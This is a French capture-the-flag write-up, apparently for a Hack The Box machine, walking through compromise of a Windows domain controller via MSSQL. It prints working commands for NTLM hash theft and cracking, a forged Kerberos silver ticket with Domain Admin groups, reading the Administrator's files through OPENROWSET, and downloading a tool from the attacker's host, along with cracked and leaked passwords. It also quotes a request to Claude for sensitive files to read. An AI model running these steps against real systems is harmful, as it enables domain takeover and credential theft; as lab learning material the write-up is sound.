@@ -1,0 +1,258 @@
+Le sujet me donne un mdp et password scott:Sm230#C5NatH
+avec NMAP seul le port mssql est ouvert
+nmap -p- 10.10.11.90
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 08:36 EDT
+Nmap scan report for 10.10.11.90
+Host is up (0.018s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+
+Grace a un module metasploit j'arrive a faire un ntlm steal sur le serveur mssql (img: sc/msf_ntlm.jpg)
+je recupère sur responder (img: sc/responder.jpg)
+que j'arrive a cracker sur hashcat (img: sc/responder.jpg)
+MSSQLSVC:purPLE9795!@
+
+je peux lister les fichiers
+impacket-mssqlclient -windows-auth 'MSSQLSVC:purPLE9795!@'@10.10.11.90
+
+SQL (SIGNED\mssqlsvc  guest@msdb)> xp_dirtree C:\
+[%] exec master.sys.xp_dirtree 'C:\',1,1
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+
+Config.Msi                      1      0   
+
+Documents and Settings          1      0   
+
+inetpub                         1      0   
+
+PerfLogs                        1      0   
+
+Program Files                   1      0   
+
+Program Files (x86)             1      0   
+
+ProgramData                     1      0   
+
+SQL2022                         1      0   
+
+System Volume Information       1      0   
+
+Users                           1      0   
+
+Windows                         1      0   
+
+
+je m'aide de ça https://github.com/Ignitetechnologies/MSSQL-Pentest-Cheatsheet?tab=readme-ov-file
+mais bon je trouves rien d'interesant 
+Je découvre le concept de silver ticket grace a ce site https://medium.com/@Tvrpism/how-does-the-silver-ticket-actually-work-368ec8905edd
+En gros quand tu intéragis avec le kdc pour utiliser un service, la dernière etape qu'il te fait c'est de te donner un ticket avec ton nom d'utilisateur chiffré avec le hash du service cible (pour qu'il le verifie lui même je pense), mais si tu as déjà réussis a compromettre le service en question (et que donc tu as son NTLM hash) tu peux créer toi même ce tiket et mettre n'importe quel nom a l'interieur, (et donc prendre le role de n'importe qui)
+
+Il faut juste que je recupère ces informations:
+
+1 who’s running the service?
+2 What’s the identifier of the service? (technically it’s called SPN — Service principal name)
+3 What’s the NTLM hash of the service?
+4 who do we want to impersonate?
+5 What’s the SID of the domain?
+
+1. ça je le sais déjà c'est le compte que je possède 'SIGNED\mssqlsvc'
+2. J'essaie de le guess grace aux infos de nmpa : MSSQLSvc/DC01.SIGNED.HTB ou MSSQLSvc/DC01
+3. je l'ai généré a partir du mdp sur internet EF699384C3285C54128A3EE1DDB1A0CC
+4. SIGNED\Administrator listé sur metasploit ?
+    je modifie le script pour print le sid qui a été bruteforce et je tombes sur 500 pour administrator (swap endieness + base 16)
+5. Metasploit nous avais donné '0105000000000005150000005b7bb0f398aa2245ad4a1ca4' il faut que je le convertisse en S-1-5-21-,https://froosh.wordpress.com/2005/10/21/hex-sid-to-decimal-sid-translation/ ça me dis en gros de prendre les 24 derniers charachteres, en 3 groupes de 8 et de faire base16 + little endian S-1-5-21-4088429403-1159899800-2753317549
+
+on a donc la commande
+
+impacket-ticketer \
+  -spn MSSQLSvc/DC01.SIGNED.HTB \
+  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
+  -user-id 500 \
+  -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' \
+  -domain signed.htb \
+  Administrator
+
+après de longues recherches apparement il faut que je rajoutes le -groups 1105 pour me co (le groupe IT qui a les droits d'admin sur la db), je pensais qu'il déduisait ça tout seul ou alors qu'il n'en avait pas besoin. Je retentes avec l'utilisateur dont je suis sur de pouvoir me connecter et en indiquant le group dans le ticket
+
+impacket-ticketer \
+  -spn MSSQLSvc/DC01.SIGNED.HTB \
+  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
+  -user-id 1103 \
+  -groups 1105 \
+  -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' \
+  -domain signed.htb \
+  MSSQLSvc
+
+  en fait il fallait pas mettre de login et il fallait que le spn corresponde a l'adresse pour se co
+
+┌──(kali㉿kali)-[~/Documents/signed]
+└─$                                                                                      
+impacket-ticketer \
+  -spn MSSQLSvc/10.10.11.90:1433 \
+  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
+  -user-id 1103 \
+  -groups 1105 \
+  -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' \
+  -domain signed.htb \
+  MSSQLSvc
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/MSSQLSvc
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in MSSQLSvc.ccache
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/signed]
+└─$ impacket-mssqlclient -no-pass -k DC01.SIGNED.HTB
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+^CTraceback (most recent call last):
+  File "/usr/share/doc/python3-impacket/examples/mssqlclient.py", line 100, in <module>
+    res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
+                               kdcHost=options.dc_ip)
+  File "/usr/lib/python3/dist-packages/impacket/tds.py", line 719, in kerberosLogin
+    instances = self.getInstances()
+  File "/usr/lib/python3/dist-packages/impacket/tds.py", line 490, in getInstances
+    ready, _, _ = select.select([ s.fileno() ], [ ] , [ ], timeout)
+                  ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/signed]
+└─$ impacket-mssqlclient -no-pass -k 10.10.11.90    
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  dbo@master)> help
+
+J'active ensuite xp_cmdshell grace aux nouveaux droits
+avec revshells.com je génere un reverse shell en base64, je l'éxecute et hop j'ai un foothold.
+Le user.txt se trouves sur le Desktop de mssqlsvc
+A partir de là mon manque d'experience sur microsoft m'a bloqué, j'ai donc du tricher
+Mais même avec la solution (rajouter les droits domain admins/Entreprise admins au compte pour lire les fichiers avec OPENROWSET) je ne comprenais comment un process lancé avec un user low privilege pouvait lire des fichiers admins si on se presentait a lui comme un admin (ce n'est pas qqchose qui existe sur linux) mais après quelques recherches j'ai compris (je crois)
+Dans la doc de microsoft (https://learn.microsoft.com/en-us/sql/relational-databases/import-export/import-bulk-data-by-using-bulk-insert-or-openrowset-bulk-sql-server?view=sql-server-ver17) on lit: "To successfully read the source data, you must grant the account used by the SQL Server Database Engine, access to the source data. In contrast, if a SQL Server user logs on by using Windows Authentication, the user can read only those files that can be accessed by the user account, regardless of the security profile of the SQL Server process." et en gros sur windows on peut donner des droits a des services de réutiliser le contexte de connexion qu'on lui a donné pour executer comme si il était ce compte
+
+J'ajoutes donc ces deux groupes a mon silver ticket
+
+impacket-ticketer \
+  -spn MSSQLSvc/10.10.11.90:1433 \
+  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
+  -user-id 1103 \
+  -groups 1105,512,519 \
+  -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' \
+  -domain signed.htb \
+  MSSQLSvc
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/MSSQLSvc
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in MSSQLSvc.ccache
+                                                                                                                                                                                                                                                                                                                                                        
+┌──(kali㉿kali)-[~/Documents/signed]
+└─$ impacket-mssqlclient -windows-auth -no-pass -k 10.10.11.90
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  dbo@master)>
+
+maintenant il faut que je vois comment activer openrowset
+
+j'active la fonction et je vais chercher le root flag
+
+┌──(kali㉿kali)-[~/Documents/signed]
+└─$ impacket-mssqlclient -windows-auth -no-pass -k 10.10.11.90
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  dbo@master)> select user_name();
+      
+---   
+dbo   
+
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+    
+-   
+1   
+
+SQL (SIGNED\mssqlsvc  dbo@master)> sp_configure 'show advanced options', 1
+INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SIGNED\mssqlsvc  dbo@master)> 
+SQL (SIGNED\mssqlsvc  dbo@master)> sp_configure 'Ole Automation Procedures', 1
+INFO(DC01): Line 196: Configuration option 'Ole Automation Procedures' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE
+ 
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
+BulkColumn                                
+---------------------------------------   
+b'a5f12c409914b8221e13a754db1adeef\r\n' 
+
+Mais bon une box n'est pas vraiment finie si on a pas accès au compte Administrator pour executer des trucs
+
+en demandant
+"in a ctf i can read every files as Administrator (yes even the root.txt flag in the desktop) but i can't exec a command, and it bothers me because for me it isn't finished if we can't execute a command as an Administrator, what interesting files can i read ?" a claude AI il me propose une liste de fichiers dont:
+C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents
+après avoir recherché sur le serv mssql je tombes sur (file: ./ConsoleHost_history.txt)
+"Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset\r"
+
+on a donc le mdp pour Administrator:Th1s889Rabb!t
+
+wget "http://10.10.14.92:9090/RunasCs.exe" -OutFile "runas.exe"
+
+PS C:\Users\mssqlsvc\Downloads> ./runas.exe Administrator Th1s889Rabb!t "cmd /c whoami /all"
+
+
+USER INFORMATION
+----------------
+
+User Name            SID                                          
+==================== =============================================
+signed\administrator S-1-5-21-4088429403-1159899800-2753317549-500
+
+Terminé (je pourrais faire un reverse shell mais bon flemme)
+
+Bilan:
+J'aurais clairement pas pût la faire tout seul, j'aurais été bloqué indéfiniement sur le privesc car ma méconnaissance de windows m'empechait de penser qu'un process lancé avec un user pouvait impersonate un admin comme ça, sinon le reste était faisable je penses, en tout cas j'ai beaucoup appris et c'est le principal
